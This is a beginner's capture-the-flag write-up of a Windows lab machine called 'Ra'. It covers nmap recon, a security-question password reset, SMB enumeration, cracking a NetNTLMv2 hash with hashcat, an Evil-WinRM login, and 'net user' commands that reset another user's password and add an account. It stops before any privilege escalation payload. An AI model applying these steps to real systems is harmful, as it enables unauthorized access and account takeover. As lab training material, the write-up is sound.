# Ra
this box is the only box from WindCorp available for free. 
Its rated insane. And I am a n00b. Lets see how far I can reach.

```

You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).

Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?
```

Okay so these will be windows machines.

# 1. Recon

```
❯ nmap -script=default -sV -A -T4 10.10.230.86
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 23:11 EST
Nmap scan report for 10.10.230.86
Host is up (0.22s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE             VERSION
53/tcp   open  domain              Simple DNS Plus
80/tcp   open  http                Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-02-21 04:12:01Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
|_ssl-date: 2021-02-21T04:13:32+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2021-02-21T04:12:53+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2021-02-20T03:53:17
|_Not valid after:  2021-08-22T03:53:17
|_ssl-date: 2021-02-21T04:13:32+00:00; +1s from scanner time.
5222/tcp open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 71h0txs543
|     xmpp: 
|       version: 1.0
|     features: 
| 
|     unknown: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
| 
|     auth_mechanisms: 
| 
|_    capabilities: 
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
| 
|     xmpp: 
| 
|     features: 
| 
|     unknown: 
| 
|     compression_methods: 
| 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
7070/tcp open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Feb 2021 04:11:59 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Feb 2021 04:12:09 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Feb 2021 04:12:22 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Feb 2021 04:12:23 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.91%I=7%D=2/20%Time=6031DDA3%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.91%I=7%D=2/20%Time=6031DD8F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202
SF:021\x2004:11:59\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\x
SF:2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<me
SF:ta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\
SF:n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C
SF:3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illega
SF:l\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x2
SF:0400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPO
SF:ptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021
SF:\x2004:12:09\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.91%T=SSL%I=7%D=2/20%Time=6031DDA5%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Fe
SF:b\x202021\x2004:12:22\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x20
SF:2020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title
SF:>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</
SF:head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x2004:12:23\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x204
SF:00\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-02-21T04:12:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.49 seconds
```


Okay. this is the biggest nmap scan result I have ever seen. idek how to start :P


Let's go to the company's website page instead. We have an option to search ... something, along with a reset password button at the top. Their IT staff's images are also broken, leading to `xmpp:<username>@fire.windcorp.thm`. Also, spelling mistake in Emily's review lol. The links at the bottom `About` `Contact`, etc are dead links.


Okay lets see `search`. It doesnt work.

How about `reset password` instead? that takes me to `fire.windcorp.thm/reset.asp`. Which I can't see.

Meanwhile, gobuster scans running; I see `/img`, `/css`, `/vendor`, but I get `403: Access Denied`. Very nice.

```
/index.html (Status: 200)
/img (Status: 301)
/css (Status: 301)
/Index.html (Status: 200)
/vendor (Status: 301)
/IMG (Status: 301)
/INDEX.html (Status: 200)
/CSS (Status: 301)
/Img (Status: 301)
```

I'm  writing down all of the users in a `users.txt` file, which may be needed later. Actually, looking at that url closely, it seems to be at the port `9090`. Let's go there.

Ah yes! Admin page :heart:

# 2. Gaining Access

So we get 
```
Login failed: make sure your username and password are correct and that you're an admin.
```

As expected. Which means the usernames may not work ... or they might, since its the IT staff afterall. I want to know if its a generic error, or maybe its kind enough to tell us if the password's wrong. ... Yeah nope. Dead end. 

Maybe SQL injection? ... nope again. 

Maybe reset password? ... Yeah. So we have a question about dog name, with that person being `Lily Levesque`. Hmmm. She's not there in the IT staff list, but looking at the source, we have the jpg named: `img/lilyleAndSparky.jpg`. Nice.

Ayyy 

![](https://i.imgur.com/Pxa0PvP.png)

But ... trying this out for the admin page doesn't work. So, dead end there.

Let's try instead logging in with the username and the password that we have got. We use `smbmap` to enumerate the drives across an entire domain.

```
❯ smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
[+] IP: windcorp.thm:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

Let's try going in using `smbclient`.

`❯ smbclient //10.10.73.52/Shared -U lilyle --password ChangeMe#1234`

```
smb: \> ls
  .                                   D        0  Fri May 29 20:45:42 2020
  ..                                  D        0  Fri May 29 20:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 11:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 20:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 07:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 07:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 07:07:24 2020

                15587583 blocks of size 4096. 10913105 blocks available
smb: \> get "Flag 1.txt"
getting file \Flag 1.txt of size 45 as Flag 1.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Then cat it on your system. First flag done!

## 3. Foothold

Now this spark thing has been popping up a lot, and I see no other alternative to go. Can't be bothered to download the actual `.deb`, so I'll just get from here :P

At this point, you'd install the deb and do some magic, which I couldn't. Some java bt (bad time). So, I went to a writeup, and took this NTLMv2 hash, and restarted from there.

(btw ... buse, the person whom we use is the one on the IT staff list)

```
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.                                                                        
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe6152a31f04df0:01010000000000004b749f876555d6014350ab75446d0e3a000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c00080030003000000000000000010000000020000073b171a2270f43dc6457d587e7ed686ba5cb926d2746466aa21e11ff6a99e5a00a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe...000000
Time.Started.....: Sun Feb 21 23:42:21 2021 (4 secs)
Time.Estimated...: Sun Feb 21 23:42:25 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   846.1 kH/s (3.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2961408/14344385 (20.65%)
Rejected.........: 0/2961408 (0.00%)
Restore.Point....: 2957312/14344385 (20.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: v10014318 -> utrox11

Started: Sun Feb 21 23:41:48 2021
Stopped: Sun Feb 21 23:42:26 2021
```

We get the password `uzunLM+3131`!

Time to get into the machine. We will use `Evil-WinRM`. (go to the github page for instructions on how to download)

Looking around we have the second flag!

```
*Evil-WinRM* PS C:\Users\buse\Desktop> ls


    Directory: C:\Users\buse\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   3:00 AM                Also stuff
d-----         5/7/2020   2:58 AM                Stuff
-a----         5/2/2020  11:53 AM             45 Flag 2.txt
-a----         5/1/2020   8:33 AM             37 Notes.txt


```

so ... its time ...

## 4. Priv Esc

Going way back, we see a directory named `scripts`. That looks odd. Let's check the files in it. One is `*.ps1`. ps1 can be expanded to `power shell 1`. This is parallel to `*.sh` files in linux, used to run bash scripts. This means ... there's juice :D

(I am reading only through comments.)

```
# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt
```

Okay so we need to get into Brittany's account, and put code that we want in `hosts.txt`.

Okay. We do not have the permissions to even read `/brittanycr`'s contents. But, I have 2 options:
1. Remove the account if possible, and create a new one with the same name
2. or, well, if you have the permissions to change password, just do that, and login as brittanycr.

I treid googling how to, and came up with this: `*Evil-WinRM* PS C:\Users> net user <username> <password>`

```
*Evil-WinRM* PS C:\Users> net user brittanycr securepass
net.exe : The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
    + CategoryInfo          : NotSpecified: (The password do...y requirements.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2245.
```

Trying it out, apparently we have to make the password stronger ... which means we can change it?

You could do random guesses to figure the right one, but we have the answer already, as was with `lilyle`'s accounts ;)

```
*Evil-WinRM* PS C:\Users> net user brittanycr ChangeMe#1234
The command completed successfully.
```

:stonks:

```
❯ evil-winrm -u brittanycr -p ChangeMe#1234 -i 10.10.16.138

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                                                              

Error: Exiting with code 1
```

Okay this should have worked. But what else ... ? 

Meanwhile, let's login as `buse`, and add ourselves to the network :D `net user <username> <password> /add`.

```
*Evil-WinRM* PS C:\Users\buse\Documents> net user tanishq ChangeMe#1234 /add
The command completed successfully.
```

```
*Evil-WinRM* PS C:\Users\buse\Documents> net localgroup Administrators tanishq /add
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Access is denied.
```

Ah shet. We dont have enough permissions to add ourselves. 

Let's try `smbmap` and `smbclient` for brittany instead.

```
❯ smbmap -u brittanycr -p ChangeMe#1234 -H 10.10.16.138
[+] IP: 10.10.16.138:445        Name: 10.10.16.138                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

So the password has changed, and we can login! We get the `hosts.txt` file, finally. 
```
❯ cat hosts.txt
google.com
cisco.com
```

Now, add the commands, and put the file. Easy? my dumbass still can't figure that. 

:(((
